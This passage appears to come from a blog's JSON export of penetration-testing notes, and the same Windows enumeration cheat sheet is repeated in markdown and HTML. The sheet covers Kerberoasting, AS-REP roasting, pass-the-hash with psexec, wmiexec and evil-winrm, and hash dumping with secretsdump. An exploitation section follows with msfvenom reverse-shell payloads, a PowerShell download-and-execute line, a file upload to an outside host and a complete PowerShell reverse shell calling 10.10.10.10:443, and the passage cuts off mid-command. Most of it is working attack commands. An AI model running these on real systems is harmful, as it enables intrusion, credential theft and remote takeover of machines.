addresses\n```bash\nGetADUsers.py -all $domain/$username -dc-ip $IP\n```\n\n<br>\n\n#### GetUserSPNs.py\n  - fetch Service Principal Names that are associated with normal user accounts\n  - give a ticket encrypted with the user account's password that we can crack.\n\n```bash \nGetUserSPNs.py -request -dc-ip $IP $domain/$user -save -outputfile GetUserSPNs.out\n```\n```bash Crack krb5tgs ticket\nhashcat -m 13100 -a 0 GetUserSPNs.out /usr/share/wordlists/rockyou.txt --force\n```\n\n<br>\n\n#### GetNPUsers.py\n  - retrieve domain users who have \"Do not require Kerberos preauthentication\" set and ask for their TGTs without knowing their passwords\n\n```bash\npython3 GetNPUsers.py $domain/ -dc-ip $IP -usersfile users.txt -format hashcat -outputfile hashes.txt\n```\n\n<br>\n\n#### PSExec.py\n  - psexec like functionality; shell on the Windows host\n\n```bash\npsexec.py $domain/$user:$pass@$IP\n\npsexec.py -hashes 'aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff' -dc-ip $IP administrator@$IP\n```\n\n<br>\n\n#### WMIexec.py\n  - execute commands through WMI, similar to `smbexec.py`\n  - runs under user (must be Admin) and is not noisy (as smbexec.py)\n  - drawback: needs DCOM - access to DCOM ports\n\n```bash\nwmiexec.py 'administrator:$pass@$IP'\n\nwmiexec.py -hashes 'aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff' -dc-ip $IP administrator@$IP\n```\n\n<br>\n\n#### Secretsdump.py\n - dump hashes from the remote machine\n - for SAM and LSA Secrets (including cached creds) read as much from the hives\n - from NTDS.dit extract domain users, hashes, kerberos keys\n\n```bash\n# mounted Share in Windows/System32/config\nsecretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL\n```\n\n<br>\n\n#### MsSQLclient.py\n- authenticate and run commands in a MSSQL server\n\n```bash \nmssqlclient.py $user:'$pass'@$IP -windows-auth\n```\n\n<br>\n\n\n\n\n\n## Services by ports\n\n### Port 139/TCP,445/TCP - SMB\n```bash\nenum4linux -a $IP\n```\n```bash\n# recursively list all files in available shares\nsmbmap -H $IP -R\n\nsmbmap -H $IP -d $domain -u \"$user\" -p \"$pass\"\n```\n```bash\n# connect to share without a password\nsmbclient //$IP/Share_name -U \"\"%\"\"\n\n# connect to share with username and password\nsmbclient //$IP/Share_name -U $domain\\\\$user%$pass\n```\n```bash\ncrackmapexec smb $IP -u users -p users --continue-on-success\n```\n\n<br>\n\n### Port 139/TCP,445/TCP - NetBIOS,SMB\n```bash Authenticate with Impacket script - mssqlclient\nmssqlclient.py $user:'$pass'@$IP -windows-auth\n```\n\n<br>\n\n### Port 161/UDP - SNMP\nNormal enumeration\n```bash\nsnmpwalk -v 2c -c public $IP\n```\nEnable MIB support - translate OIDs (Object Identifiers)\n> comment out the only uncommented line to use the mibs\n```bash\nsudo apt install snmp-mibs-downloader\nsudo nano /etc/snmp/snmp.conf\n```\n\n```bash hrSWRunTable: Retrieves detailed information about all running processes\nsnmpwalk -v 2c -c public $IP hrSWRunTable\n# included information:\n#   - hrSWRunIndex: Unique index for each running process.\n#   - hrSWRunName: Name of each running process.\n#   - hrSWRunID: Unique ID of the process.\n#   - hrSWRunPath: Full path to the executable file of the process.\n#   - hrSWRunParameters: Command-line parameters used to start the process.\n#   - hrSWRunType: Type of process (e.g., application, system).\n```\n\n<br>\n\n### Port 389/TCP,UDP - LDAP\n```bash\nldapsearch -x -h $IP -s base namingcontexts\n# -x              simple auth\n# -s base         set the scope base\n# namingcontext   return naming contexts\n\nldapsearch -x -h $IP -b 'DC=$domain,DC=LOCAL'\n```\n\n<br>\n\n### Port 5985/TCP,5986/TCP - WinRM\n```bash\ncrackmapexec winrm $IP -u $user -p '$pass'\n```\n```bash\nevil-winrm -i $IP -u $user -p '$pass'\n\nevil-winrm -i $IP -u administrator -H d9485863c1e9e05851aa40cbb4ab9dff\n```\n\n<br>\n\n---\n---","source":"_posts/Pentesting/Windows/3.md","raw":"---\ntitle: 3. Enumeration - Windows\ncategories:\n  - Pentesting\n  - Windows\ntags:\n  - Pentesting\n  - Windows\n  - Enumeration\ntoc: true\n---\n\n---\nStep 3 in a penetration test: Enumeration.\nTry to find relevant info to enter the target machine.\n\n---\n<!-- more -->\n\n## Active Directory\n\n### Impacket scripts\n\n#### GetADUsers.py\n  - gather data about the domain's users and their corresponding email addresses\n```bash\nGetADUsers.py -all $domain/$username -dc-ip $IP\n```\n\n<br>\n\n#### GetUserSPNs.py\n  - fetch Service Principal Names that are associated with normal user accounts\n  - give a ticket encrypted with the user account's password that we can crack.\n\n```bash \nGetUserSPNs.py -request -dc-ip $IP $domain/$user -save -outputfile GetUserSPNs.out\n```\n```bash Crack krb5tgs ticket\nhashcat -m 13100 -a 0 GetUserSPNs.out /usr/share/wordlists/rockyou.txt --force\n```\n\n<br>\n\n#### GetNPUsers.py\n  - retrieve domain users who have \"Do not require Kerberos preauthentication\" set and ask for their TGTs without knowing their passwords\n\n```bash\npython3 GetNPUsers.py $domain/ -dc-ip $IP -usersfile users.txt -format hashcat -outputfile hashes.txt\n```\n\n<br>\n\n#### PSExec.py\n  - psexec like functionality; shell on the Windows host\n\n```bash\npsexec.py $domain/$user:$pass@$IP\n\npsexec.py -hashes 'aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff' -dc-ip $IP administrator@$IP\n```\n\n<br>\n\n#### WMIexec.py\n  - execute commands through WMI, similar to `smbexec.py`\n  - runs under user (must be Admin) and is not noisy (as smbexec.py)\n  - drawback: needs DCOM - access to DCOM ports\n\n```bash\nwmiexec.py 'administrator:$pass@$IP'\n\nwmiexec.py -hashes 'aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff' -dc-ip $IP administrator@$IP\n```\n\n<br>\n\n#### Secretsdump.py\n - dump hashes from the remote machine\n - for SAM and LSA Secrets (including cached creds) read as much from the hives\n - from NTDS.dit extract domain users, hashes, kerberos keys\n\n```bash\n# mounted Share in Windows/System32/config\nsecretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL\n```\n\n<br>\n\n#### MsSQLclient.py\n- authenticate and run commands in a MSSQL server\n\n```bash \nmssqlclient.py $user:'$pass'@$IP -windows-auth\n```\n\n<br>\n\n\n\n\n\n## Services by ports\n\n### Port 139/TCP,445/TCP - SMB\n```bash\nenum4linux -a $IP\n```\n```bash\n# recursively list all files in available shares\nsmbmap -H $IP -R\n\nsmbmap -H $IP -d $domain -u \"$user\" -p \"$pass\"\n```\n```bash\n# connect to share without a password\nsmbclient //$IP/Share_name -U \"\"%\"\"\n\n# connect to share with username and password\nsmbclient //$IP/Share_name -U $domain\\\\$user%$pass\n```\n```bash\ncrackmapexec smb $IP -u users -p users --continue-on-success\n```\n\n<br>\n\n### Port 139/TCP,445/TCP - NetBIOS,SMB\n```bash Authenticate with Impacket script - mssqlclient\nmssqlclient.py $user:'$pass'@$IP -windows-auth\n```\n\n<br>\n\n### Port 161/UDP - SNMP\nNormal enumeration\n```bash\nsnmpwalk -v 2c -c public $IP\n```\nEnable MIB support - translate OIDs (Object Identifiers)\n> comment out the only uncommented line to use the mibs\n```bash\nsudo apt install snmp-mibs-downloader\nsudo nano /etc/snmp/snmp.conf\n```\n\n```bash hrSWRunTable: Retrieves detailed information about all running processes\nsnmpwalk -v 2c -c public $IP hrSWRunTable\n# included information:\n#   - hrSWRunIndex: Unique index for each running process.\n#   - hrSWRunName: Name of each running process.\n#   - hrSWRunID: Unique ID of the process.\n#   - hrSWRunPath: Full path to the executable file of the process.\n#   - hrSWRunParameters: Command-line parameters used to start the process.\n#   - hrSWRunType: Type of process (e.g., application, system).\n```\n\n<br>\n\n### Port 389/TCP,UDP - LDAP\n```bash\nldapsearch -x -h $IP -s base namingcontexts\n# -x              simple auth\n# -s base         set the scope base\n# namingcontext   return naming contexts\n\nldapsearch -x -h $IP -b 'DC=$domain,DC=LOCAL'\n```\n\n<br>\n\n### Port 5985/TCP,5986/TCP - WinRM\n```bash\ncrackmapexec winrm $IP -u $user -p '$pass'\n```\n```bash\nevil-winrm -i $IP -u $user -p '$pass'\n\nevil-winrm -i $IP -u administrator -H d9485863c1e9e05851aa40cbb4ab9dff\n```\n\n<br>\n\n---\n---","slug":"Pentesting/Windows/3","published":1,"date":"2024-09-23T06:18:55.870Z","updated":"2024-09-23T06:18:55.870Z","comments":1,"layout":"post","photos":[],"_id":"cm1emkmhz00166gvg9ko0dly8","content":"<hr>\n<p>Step 3 in a penetration test: Enumeration.<br>Try to find relevant info to enter the target machine.</p>\n<hr>\n<span id=\"more\"></span>\n\n<h2 id=\"Active-Directory\"><a href=\"#Active-Directory\" class=\"headerlink\" title=\"Active Directory\"></a>Active Directory</h2><h3 id=\"Impacket-scripts\"><a href=\"#Impacket-scripts\" class=\"headerlink\" title=\"Impacket scripts\"></a>Impacket scripts</h3><h4 id=\"GetADUsers-py\"><a href=\"#GetADUsers-py\" class=\"headerlink\" title=\"GetADUsers.py\"></a>GetADUsers.py</h4><ul>\n<li>gather data about the domains users and their corresponding email addresses<pre><code class=\"highlight bash\">GetADUsers.py -all <span class=\"variable\">$domain</span>/<span class=\"variable\">$username</span> -dc-ip <span class=\"variable\">$IP</span></code></pre></li>\n</ul>\n<br>\n\n<h4 id=\"GetUserSPNs-py\"><a href=\"#GetUserSPNs-py\" class=\"headerlink\" title=\"GetUserSPNs.py\"></a>GetUserSPNs.py</h4><ul>\n<li>fetch Service Principal Names that are associated with normal user accounts</li>\n<li>give a ticket encrypted with the user accounts password that we can crack.</li>\n</ul>\n<pre><code class=\"highlight bash\">GetUserSPNs.py -request -dc-ip <span class=\"variable\">$IP</span> <span class=\"variable\">$domain</span>/<span class=\"variable\">$user</span> -save -outputfile GetUserSPNs.out</code></pre>\n<pre><div class=\"caption\"><span>Crack krb5tgs ticket</span></div><code class=\"highlight bash\">hashcat -m 13100 -a 0 GetUserSPNs.out /usr/share/wordlists/rockyou.txt --force</code></pre>\n\n<br>\n\n<h4 id=\"GetNPUsers-py\"><a href=\"#GetNPUsers-py\" class=\"headerlink\" title=\"GetNPUsers.py\"></a>GetNPUsers.py</h4><ul>\n<li>retrieve domain users who have Do not require Kerberos preauthentication set and ask for their TGTs without knowing their passwords</li>\n</ul>\n<pre><code class=\"highlight bash\">python3 GetNPUsers.py <span class=\"variable\">$domain</span>/ -dc-ip <span class=\"variable\">$IP</span> -usersfile users.txt -format hashcat -outputfile hashes.txt</code></pre>\n\n<br>\n\n<h4 id=\"PSExec-py\"><a href=\"#PSExec-py\" class=\"headerlink\" title=\"PSExec.py\"></a>PSExec.py</h4><ul>\n<li>psexec like functionality; shell on the Windows host</li>\n</ul>\n<pre><code class=\"highlight bash\">psexec.py <span class=\"variable\">$domain</span>/<span class=\"variable\">$user</span>:<span class=\"variable\">$pass</span>@<span class=\"variable\">$IP</span>\n\npsexec.py -hashes <span class=\"string\">&#x27;aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff&#x27;</span> -dc-ip <span class=\"variable\">$IP</span> administrator@<span class=\"variable\">$IP</span></code></pre>\n\n<br>\n\n<h4 id=\"WMIexec-py\"><a href=\"#WMIexec-py\" class=\"headerlink\" title=\"WMIexec.py\"></a>WMIexec.py</h4><ul>\n<li>execute commands through WMI, similar to <code>smbexec.py</code></li>\n<li>runs under user (must be Admin) and is not noisy (as smbexec.py)</li>\n<li>drawback: needs DCOM - access to DCOM ports</li>\n</ul>\n<pre><code class=\"highlight bash\">wmiexec.py <span class=\"string\">&#x27;administrator:$pass@$IP&#x27;</span>\n\nwmiexec.py -hashes <span class=\"string\">&#x27;aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff&#x27;</span> -dc-ip <span class=\"variable\">$IP</span> administrator@<span class=\"variable\">$IP</span></code></pre>\n\n<br>\n\n<h4 id=\"Secretsdump-py\"><a href=\"#Secretsdump-py\" class=\"headerlink\" title=\"Secretsdump.py\"></a>Secretsdump.py</h4><ul>\n<li>dump hashes from the remote machine</li>\n<li>for SAM and LSA Secrets (including cached creds) read as much from the hives</li>\n<li>from NTDS.dit extract domain users, hashes, kerberos keys</li>\n</ul>\n<pre><code class=\"highlight bash\"><span class=\"comment\"># mounted Share in Windows/System32/config</span>\nsecretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL</code></pre>\n\n<br>\n\n<h4 id=\"MsSQLclient-py\"><a href=\"#MsSQLclient-py\" class=\"headerlink\" title=\"MsSQLclient.py\"></a>MsSQLclient.py</h4><ul>\n<li>authenticate and run commands in a MSSQL server</li>\n</ul>\n<pre><code class=\"highlight bash\">mssqlclient.py <span class=\"variable\">$user</span>:<span class=\"string\">&#x27;$pass&#x27;</span>@<span class=\"variable\">$IP</span> -windows-auth</code></pre>\n\n<br>\n\n\n\n\n\n<h2 id=\"Services-by-ports\"><a href=\"#Services-by-ports\" class=\"headerlink\" title=\"Services by ports\"></a>Services by ports</h2><h3 id=\"Port-139-TCP-445-TCP-SMB\"><a href=\"#Port-139-TCP-445-TCP-SMB\" class=\"headerlink\" title=\"Port 139&#x2F;TCP,445&#x2F;TCP - SMB\"></a>Port 139&#x2F;TCP,445&#x2F;TCP - SMB</h3><pre><code class=\"highlight bash\">enum4linux -a <span class=\"variable\">$IP</span></code></pre>\n<pre><code class=\"highlight bash\"><span class=\"comment\"># recursively list all files in available shares</span>\nsmbmap -H <span class=\"variable\">$IP</span> -R\n\nsmbmap -H <span class=\"variable\">$IP</span> -d <span class=\"variable\">$domain</span> -u <span class=\"string\">&quot;<span class=\"variable\">$user</span>&quot;</span> -p <span class=\"string\">&quot;<span class=\"variable\">$pass</span>&quot;</span></code></pre>\n<pre><code class=\"highlight bash\"><span class=\"comment\"># connect to share without a password</span>\nsmbclient //<span class=\"variable\">$IP</span>/Share_name -U <span class=\"string\">&quot;&quot;</span>%<span class=\"string\">&quot;&quot;</span>\n\n<span class=\"comment\"># connect to share with username and password</span>\nsmbclient //<span class=\"variable\">$IP</span>/Share_name -U <span class=\"variable\">$domain</span>\\\\<span class=\"variable\">$user</span>%<span class=\"variable\">$pass</span></code></pre>\n<pre><code class=\"highlight bash\">crackmapexec smb <span class=\"variable\">$IP</span> -u <span class=\"built_in\">users</span> -p <span class=\"built_in\">users</span> --continue-on-success</code></pre>\n\n<br>\n\n<h3 id=\"Port-139-TCP-445-TCP-NetBIOS-SMB\"><a href=\"#Port-139-TCP-445-TCP-NetBIOS-SMB\" class=\"headerlink\" title=\"Port 139&#x2F;TCP,445&#x2F;TCP - NetBIOS,SMB\"></a>Port 139&#x2F;TCP,445&#x2F;TCP - NetBIOS,SMB</h3><pre><div class=\"caption\"><span>Authenticate with Impacket script - mssqlclient</span></div><code class=\"highlight bash\">mssqlclient.py <span class=\"variable\">$user</span>:<span class=\"string\">&#x27;$pass&#x27;</span>@<span class=\"variable\">$IP</span> -windows-auth</code></pre>\n\n<br>\n\n<h3 id=\"Port-161-UDP-SNMP\"><a href=\"#Port-161-UDP-SNMP\" class=\"headerlink\" title=\"Port 161&#x2F;UDP - SNMP\"></a>Port 161&#x2F;UDP - SNMP</h3><p>Normal enumeration</p>\n<pre><code class=\"highlight bash\">snmpwalk -v 2c -c public <span class=\"variable\">$IP</span></code></pre>\n<p>Enable MIB support - translate OIDs (Object Identifiers)</p>\n<blockquote>\n<p>comment out the only uncommented line to use the mibs</p>\n</blockquote>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">sudo</span> apt install snmp-mibs-downloader\n<span class=\"built_in\">sudo</span> nano /etc/snmp/snmp.conf</code></pre>\n\n<pre><div class=\"caption\"><span>hrSWRunTable: Retrieves detailed information about all running processes</span></div><code class=\"highlight bash\">snmpwalk -v 2c -c public <span class=\"variable\">$IP</span> hrSWRunTable\n<span class=\"comment\"># included information:</span>\n<span class=\"comment\">#   - hrSWRunIndex: Unique index for each running process.</span>\n<span class=\"comment\">#   - hrSWRunName: Name of each running process.</span>\n<span class=\"comment\">#   - hrSWRunID: Unique ID of the process.</span>\n<span class=\"comment\">#   - hrSWRunPath: Full path to the executable file of the process.</span>\n<span class=\"comment\">#   - hrSWRunParameters: Command-line parameters used to start the process.</span>\n<span class=\"comment\">#   - hrSWRunType: Type of process (e.g., application, system).</span></code></pre>\n\n<br>\n\n<h3 id=\"Port-389-TCP-UDP-LDAP\"><a href=\"#Port-389-TCP-UDP-LDAP\" class=\"headerlink\" title=\"Port 389&#x2F;TCP,UDP - LDAP\"></a>Port 389&#x2F;TCP,UDP - LDAP</h3><pre><code class=\"highlight bash\">ldapsearch -x -h <span class=\"variable\">$IP</span> -s base namingcontexts\n<span class=\"comment\"># -x              simple auth</span>\n<span class=\"comment\"># -s base         set the scope base</span>\n<span class=\"comment\"># namingcontext   return naming contexts</span>\n\nldapsearch -x -h <span class=\"variable\">$IP</span> -b <span class=\"string\">&#x27;DC=$domain,DC=LOCAL&#x27;</span></code></pre>\n\n<br>\n\n<h3 id=\"Port-5985-TCP-5986-TCP-WinRM\"><a href=\"#Port-5985-TCP-5986-TCP-WinRM\" class=\"headerlink\" title=\"Port 5985&#x2F;TCP,5986&#x2F;TCP - WinRM\"></a>Port 5985&#x2F;TCP,5986&#x2F;TCP - WinRM</h3><pre><code class=\"highlight bash\">crackmapexec winrm <span class=\"variable\">$IP</span> -u <span class=\"variable\">$user</span> -p <span class=\"string\">&#x27;$pass&#x27;</span></code></pre>\n<pre><code class=\"highlight bash\">evil-winrm -i <span class=\"variable\">$IP</span> -u <span class=\"variable\">$user</span> -p <span class=\"string\">&#x27;$pass&#x27;</span>\n\nevil-winrm -i <span class=\"variable\">$IP</span> -u administrator -H d9485863c1e9e05851aa40cbb4ab9dff</code></pre>\n\n<br>\n\n<hr>\n<hr>\n","excerpt":"<hr>\n<p>Step 3 in a penetration test: Enumeration.<br>Try to find relevant info to enter the target machine.</p>\n<hr>","more":"<h2 id=\"Active-Directory\"><a href=\"#Active-Directory\" class=\"headerlink\" title=\"Active Directory\"></a>Active Directory</h2><h3 id=\"Impacket-scripts\"><a href=\"#Impacket-scripts\" class=\"headerlink\" title=\"Impacket scripts\"></a>Impacket scripts</h3><h4 id=\"GetADUsers-py\"><a href=\"#GetADUsers-py\" class=\"headerlink\" title=\"GetADUsers.py\"></a>GetADUsers.py</h4><ul>\n<li>gather data about the domains users and their corresponding email addresses<pre><code class=\"highlight bash\">GetADUsers.py -all <span class=\"variable\">$domain</span>/<span class=\"variable\">$username</span> -dc-ip <span class=\"variable\">$IP</span></code></pre></li>\n</ul>\n<br>\n\n<h4 id=\"GetUserSPNs-py\"><a href=\"#GetUserSPNs-py\" class=\"headerlink\" title=\"GetUserSPNs.py\"></a>GetUserSPNs.py</h4><ul>\n<li>fetch Service Principal Names that are associated with normal user accounts</li>\n<li>give a ticket encrypted with the user accounts password that we can crack.</li>\n</ul>\n<pre><code class=\"highlight bash\">GetUserSPNs.py -request -dc-ip <span class=\"variable\">$IP</span> <span class=\"variable\">$domain</span>/<span class=\"variable\">$user</span> -save -outputfile GetUserSPNs.out</code></pre>\n<pre><div class=\"caption\"><span>Crack krb5tgs ticket</span></div><code class=\"highlight bash\">hashcat -m 13100 -a 0 GetUserSPNs.out /usr/share/wordlists/rockyou.txt --force</code></pre>\n\n<br>\n\n<h4 id=\"GetNPUsers-py\"><a href=\"#GetNPUsers-py\" class=\"headerlink\" title=\"GetNPUsers.py\"></a>GetNPUsers.py</h4><ul>\n<li>retrieve domain users who have Do not require Kerberos preauthentication set and ask for their TGTs without knowing their passwords</li>\n</ul>\n<pre><code class=\"highlight bash\">python3 GetNPUsers.py <span class=\"variable\">$domain</span>/ -dc-ip <span class=\"variable\">$IP</span> -usersfile users.txt -format hashcat -outputfile hashes.txt</code></pre>\n\n<br>\n\n<h4 id=\"PSExec-py\"><a href=\"#PSExec-py\" class=\"headerlink\" title=\"PSExec.py\"></a>PSExec.py</h4><ul>\n<li>psexec like functionality; shell on the Windows host</li>\n</ul>\n<pre><code class=\"highlight bash\">psexec.py <span class=\"variable\">$domain</span>/<span class=\"variable\">$user</span>:<span class=\"variable\">$pass</span>@<span class=\"variable\">$IP</span>\n\npsexec.py -hashes <span class=\"string\">&#x27;aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff&#x27;</span> -dc-ip <span class=\"variable\">$IP</span> administrator@<span class=\"variable\">$IP</span></code></pre>\n\n<br>\n\n<h4 id=\"WMIexec-py\"><a href=\"#WMIexec-py\" class=\"headerlink\" title=\"WMIexec.py\"></a>WMIexec.py</h4><ul>\n<li>execute commands through WMI, similar to <code>smbexec.py</code></li>\n<li>runs under user (must be Admin) and is not noisy (as smbexec.py)</li>\n<li>drawback: needs DCOM - access to DCOM ports</li>\n</ul>\n<pre><code class=\"highlight bash\">wmiexec.py <span class=\"string\">&#x27;administrator:$pass@$IP&#x27;</span>\n\nwmiexec.py -hashes <span class=\"string\">&#x27;aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff&#x27;</span> -dc-ip <span class=\"variable\">$IP</span> administrator@<span class=\"variable\">$IP</span></code></pre>\n\n<br>\n\n<h4 id=\"Secretsdump-py\"><a href=\"#Secretsdump-py\" class=\"headerlink\" title=\"Secretsdump.py\"></a>Secretsdump.py</h4><ul>\n<li>dump hashes from the remote machine</li>\n<li>for SAM and LSA Secrets (including cached creds) read as much from the hives</li>\n<li>from NTDS.dit extract domain users, hashes, kerberos keys</li>\n</ul>\n<pre><code class=\"highlight bash\"><span class=\"comment\"># mounted Share in Windows/System32/config</span>\nsecretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL</code></pre>\n\n<br>\n\n<h4 id=\"MsSQLclient-py\"><a href=\"#MsSQLclient-py\" class=\"headerlink\" title=\"MsSQLclient.py\"></a>MsSQLclient.py</h4><ul>\n<li>authenticate and run commands in a MSSQL server</li>\n</ul>\n<pre><code class=\"highlight bash\">mssqlclient.py <span class=\"variable\">$user</span>:<span class=\"string\">&#x27;$pass&#x27;</span>@<span class=\"variable\">$IP</span> -windows-auth</code></pre>\n\n<br>\n\n\n\n\n\n<h2 id=\"Services-by-ports\"><a href=\"#Services-by-ports\" class=\"headerlink\" title=\"Services by ports\"></a>Services by ports</h2><h3 id=\"Port-139-TCP-445-TCP-SMB\"><a href=\"#Port-139-TCP-445-TCP-SMB\" class=\"headerlink\" title=\"Port 139&#x2F;TCP,445&#x2F;TCP - SMB\"></a>Port 139&#x2F;TCP,445&#x2F;TCP - SMB</h3><pre><code class=\"highlight bash\">enum4linux -a <span class=\"variable\">$IP</span></code></pre>\n<pre><code class=\"highlight bash\"><span class=\"comment\"># recursively list all files in available shares</span>\nsmbmap -H <span class=\"variable\">$IP</span> -R\n\nsmbmap -H <span class=\"variable\">$IP</span> -d <span class=\"variable\">$domain</span> -u <span class=\"string\">&quot;<span class=\"variable\">$user</span>&quot;</span> -p <span class=\"string\">&quot;<span class=\"variable\">$pass</span>&quot;</span></code></pre>\n<pre><code class=\"highlight bash\"><span class=\"comment\"># connect to share without a password</span>\nsmbclient //<span class=\"variable\">$IP</span>/Share_name -U <span class=\"string\">&quot;&quot;</span>%<span class=\"string\">&quot;&quot;</span>\n\n<span class=\"comment\"># connect to share with username and password</span>\nsmbclient //<span class=\"variable\">$IP</span>/Share_name -U <span class=\"variable\">$domain</span>\\\\<span class=\"variable\">$user</span>%<span class=\"variable\">$pass</span></code></pre>\n<pre><code class=\"highlight bash\">crackmapexec smb <span class=\"variable\">$IP</span> -u <span class=\"built_in\">users</span> -p <span class=\"built_in\">users</span> --continue-on-success</code></pre>\n\n<br>\n\n<h3 id=\"Port-139-TCP-445-TCP-NetBIOS-SMB\"><a href=\"#Port-139-TCP-445-TCP-NetBIOS-SMB\" class=\"headerlink\" title=\"Port 139&#x2F;TCP,445&#x2F;TCP - NetBIOS,SMB\"></a>Port 139&#x2F;TCP,445&#x2F;TCP - NetBIOS,SMB</h3><pre><div class=\"caption\"><span>Authenticate with Impacket script - mssqlclient</span></div><code class=\"highlight bash\">mssqlclient.py <span class=\"variable\">$user</span>:<span class=\"string\">&#x27;$pass&#x27;</span>@<span class=\"variable\">$IP</span> -windows-auth</code></pre>\n\n<br>\n\n<h3 id=\"Port-161-UDP-SNMP\"><a href=\"#Port-161-UDP-SNMP\" class=\"headerlink\" title=\"Port 161&#x2F;UDP - SNMP\"></a>Port 161&#x2F;UDP - SNMP</h3><p>Normal enumeration</p>\n<pre><code class=\"highlight bash\">snmpwalk -v 2c -c public <span class=\"variable\">$IP</span></code></pre>\n<p>Enable MIB support - translate OIDs (Object Identifiers)</p>\n<blockquote>\n<p>comment out the only uncommented line to use the mibs</p>\n</blockquote>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">sudo</span> apt install snmp-mibs-downloader\n<span class=\"built_in\">sudo</span> nano /etc/snmp/snmp.conf</code></pre>\n\n<pre><div class=\"caption\"><span>hrSWRunTable: Retrieves detailed information about all running processes</span></div><code class=\"highlight bash\">snmpwalk -v 2c -c public <span class=\"variable\">$IP</span> hrSWRunTable\n<span class=\"comment\"># included information:</span>\n<span class=\"comment\">#   - hrSWRunIndex: Unique index for each running process.</span>\n<span class=\"comment\">#   - hrSWRunName: Name of each running process.</span>\n<span class=\"comment\">#   - hrSWRunID: Unique ID of the process.</span>\n<span class=\"comment\">#   - hrSWRunPath: Full path to the executable file of the process.</span>\n<span class=\"comment\">#   - hrSWRunParameters: Command-line parameters used to start the process.</span>\n<span class=\"comment\">#   - hrSWRunType: Type of process (e.g., application, system).</span></code></pre>\n\n<br>\n\n<h3 id=\"Port-389-TCP-UDP-LDAP\"><a href=\"#Port-389-TCP-UDP-LDAP\" class=\"headerlink\" title=\"Port 389&#x2F;TCP,UDP - LDAP\"></a>Port 389&#x2F;TCP,UDP - LDAP</h3><pre><code class=\"highlight bash\">ldapsearch -x -h <span class=\"variable\">$IP</span> -s base namingcontexts\n<span class=\"comment\"># -x              simple auth</span>\n<span class=\"comment\"># -s base         set the scope base</span>\n<span class=\"comment\"># namingcontext   return naming contexts</span>\n\nldapsearch -x -h <span class=\"variable\">$IP</span> -b <span class=\"string\">&#x27;DC=$domain,DC=LOCAL&#x27;</span></code></pre>\n\n<br>\n\n<h3 id=\"Port-5985-TCP-5986-TCP-WinRM\"><a href=\"#Port-5985-TCP-5986-TCP-WinRM\" class=\"headerlink\" title=\"Port 5985&#x2F;TCP,5986&#x2F;TCP - WinRM\"></a>Port 5985&#x2F;TCP,5986&#x2F;TCP - WinRM</h3><pre><code class=\"highlight bash\">crackmapexec winrm <span class=\"variable\">$IP</span> -u <span class=\"variable\">$user</span> -p <span class=\"string\">&#x27;$pass&#x27;</span></code></pre>\n<pre><code class=\"highlight bash\">evil-winrm -i <span class=\"variable\">$IP</span> -u <span class=\"variable\">$user</span> -p <span class=\"string\">&#x27;$pass&#x27;</span>\n\nevil-winrm -i <span class=\"variable\">$IP</span> -u administrator -H d9485863c1e9e05851aa40cbb4ab9dff</code></pre>\n\n<br>\n\n<hr>\n<hr>"},{"title":"4. Exploitation - Windows","toc":true,"_content":"\n---\nStep 4 in a penetration test: Exploitation.\nExploit the vulnerabilities found to gain access to the target machine.\n\n---\n<!-- more -->\n\n<br>\n\n## Payloads\n\n### Metasploit\n```bash\nmsfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 EXITFUNC=thread -f py -a x86 --platform windows -b \"\\x00\\x0a\\x0d\\x5c\\x5f\\x2f\\x2e\\x40\" -v shellcode \n```\n```bash\nmsfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 EXITFUNC=thread -f exe -a x86 --platform windows -o rev_10.10.10.10_443.exe\n`\n\n<br>\n\n## Exploit Scripts\n\n### PowerShell\n```powershell\nIEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10/Invoke-PowerShellTcp.ps1')\n```\n\n### Script Execution\n```batch\nc:\\path\\to\\payload.exe\n```\n\n<br>\n\n## Servers\n\n### SMB Server\n```bash\nsmbserver.py $share /path/ -smb2support -username user -password pass -port 1445 -configfile smbserver.conf\n```\n```batch\n\\\\10.10.10.10\\share\\whoami.exe\nnet use Z: \\\\10.10.10.10\\share /user:'username' 'password'\n```\n\n### HTTP Server\n```bash\npython -m http.server 8080\n```\n```batch\npowershell -Command \"Invoke-WebRequest -Uri http://10.10.10.10:8080/payload.exe -OutFile C:\\path\\to\\payload.exe\"\n```\n\n<br>\n\n## File Transfer\n\n\n```batch Download files\npowershell -Command \"Invoke-WebRequest -Uri http://10.10.10.10/file.exe -OutFile C:\\path\\to\\file.exe\"\n```\n```batch Upload files\npowershell -Command \"Invoke-WebRequest -Uri http://10.10.10.10/upload -Method Post -InFile C:\\path\\to\\file.exe\"\n```\n\n<br>\n\n## Exploitation Tools\n\n### Windows Reverse Shell (PowerShell)\n```powershell\n$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',443);\n$stream = $client.GetStream();\n[byte[]]$buffer = 0..65535|%{0};\nwhile(($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0){\n  $data = (New-Object -TypeName PSObject -Property @{Data = $buffer[0..($i-1)]}).Data;\n  $response = Invoke-Expression -Command ([Text.Encoding]::ASCII.GetString($data));\n  $response = [Text.Encoding]::ASCII.GetBytes($response + 'Prompt>');\n  $stream.Write($response, 0, $response.Length);\n}\n```\n\n<br>\n\n## Privilege Escalation\n\n### Check Privileges\n```batch\nwhoami /priv      REM Check SeImpersoantePrivilege - Juicy Potato\n```\n\n<br>\n\n### `JuicyPotato.exe` privesc from service acc to System\nUse a CLSID from the list provided by JP [here](https://github.com/ohpe/juicy-potato/tree/master/CLSID)\n```batch\njp.exe -t * -p 